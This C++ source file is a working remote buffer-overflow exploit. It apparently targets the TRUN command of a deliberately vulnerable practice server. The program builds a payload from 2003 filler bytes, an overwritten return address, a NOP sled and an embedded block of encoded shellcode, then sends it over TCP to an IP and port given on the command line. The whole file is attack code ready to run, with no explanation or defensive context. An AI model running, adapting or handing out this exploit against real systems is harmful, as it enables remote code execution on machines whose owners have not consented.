#include <iostream>
#include <boost/asio.hpp>
#include "./../helper.cpp"

using namespace boost;
using namespace std;
using namespace NAM;

#define errormayhappen                                     \
    if (ec.value())                                        \
    {                                                      \
        cerr << (string) "Error : " + ec.message() + "\n"; \
        return ec.value();                                 \
    }

string exploit = "\xbf\x85\x94\xa5\x21\xda\xc8\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
                 "\x52\x83\xc0\x04\x31\x78\x0e\x03\xfd\x9a\x47\xd4\x01\x4a\x05"
                 "\x17\xf9\x8b\x6a\x91\x1c\xba\xaa\xc5\x55\xed\x1a\x8d\x3b\x02"
                 "\xd0\xc3\xaf\x91\x94\xcb\xc0\x12\x12\x2a\xef\xa3\x0f\x0e\x6e"
                 "\x20\x52\x43\x50\x19\x9d\x96\x91\x5e\xc0\x5b\xc3\x37\x8e\xce"
                 "\xf3\x3c\xda\xd2\x78\x0e\xca\x52\x9d\xc7\xed\x73\x30\x53\xb4"
                 "\x53\xb3\xb0\xcc\xdd\xab\xd5\xe9\x94\x40\x2d\x85\x26\x80\x7f"
                 "\x66\x84\xed\x4f\x95\xd4\x2a\x77\x46\xa3\x42\x8b\xfb\xb4\x91"
                 "\xf1\x27\x30\x01\x51\xa3\xe2\xed\x63\x60\x74\x66\x6f\xcd\xf2"
                 "\x20\x6c\xd0\xd7\x5b\x88\x59\xd6\x8b\x18\x19\xfd\x0f\x40\xf9"
                 "\x9c\x16\x2c\xac\xa1\x48\x8f\x11\x04\x03\x22\x45\x35\x4e\x2b"
                 "\xaa\x74\x70\xab\xa4\x0f\x03\x99\x6b\xa4\x8b\x91\xe4\x62\x4c"
                 "\xd5\xde\xd3\xc2\x28\xe1\x23\xcb\xee\xb5\x73\x63\xc6\xb5\x1f"
                 "\x73\xe7\x63\x8f\x23\x47\xdc\x70\x93\x27\x8c\x18\xf9\xa7\xf3"
                 "\x39\x02\x62\x9c\xd0\xf9\xe5\x63\x8c\x01\xfc\x0b\xcf\x01\x15"
                 "\x7f\x46\xe7\x7f\x6f\x0f\xb0\x17\x16\x0a\x4a\x89\xd7\x80\x37"
                 "\x89\x5c\x27\xc8\x44\x95\x42\xda\x31\x55\x19\x80\x94\x6a\xb7"
                 "\xac\x7b\xf8\x5c\x2c\xf5\xe1\xca\x7b\x52\xd7\x02\xe9\x4e\x4e"
                 "\xbd\x0f\x93\x16\x86\x8b\x48\xeb\x09\x12\x1c\x57\x2e\x04\xd8"
                 "\x58\x6a\x70\xb4\x0e\x24\x2e\x72\xf9\x86\x98\x2c\x56\x41\x4c"
                 "\xa8\x94\x52\x0a\xb5\xf0\x24\xf2\x04\xad\x70\x0d\xa8\x39\x75"
                 "\x76\xd4\xd9\x7a\xad\x5c\xf9\x98\x67\xa9\x92\x04\xe2\x10\xff"
                 "\xb6\xd9\x57\x06\x35\xeb\x27\xfd\x25\x9e\x22\xb9\xe1\x73\x5f"
                 "\xd2\x87\x73\xcc\xd3\x8d";

int main(int argc, char *argv[])
{
    string payload = createstr('A', 2003);

    payload = "TRUN /.:/" + payload + "\xaf\x11\x50\x62" + createstr("\x90", 32) + exploit;
    if (argc != 3)
    {
        cerr << (string) "Usage : " + argv[1] + " <ip> <port>";
        return 0;
    }

    asio::io_service ioservice;
    system::error_code ec;
    asio::ip::address ip = asio::ip::address::from_string(argv[1], ec);
    int port = atoi(argv[2]);
    asio::ip::tcp::endpoint ep(ip, port);
    errormayhappen;
    asio::ip::tcp::socket client(ioservice);
    client.open(asio::ip::tcp::v4(), ec);
    errormayhappen;
    client.connect(ep, ec);
    errormayhappen;

    client.write_some(asio::buffer(payload.data(), payload.size()), ec);
    errormayhappen;

    client.close(ec);
    errormayhappen;

    return 0;
}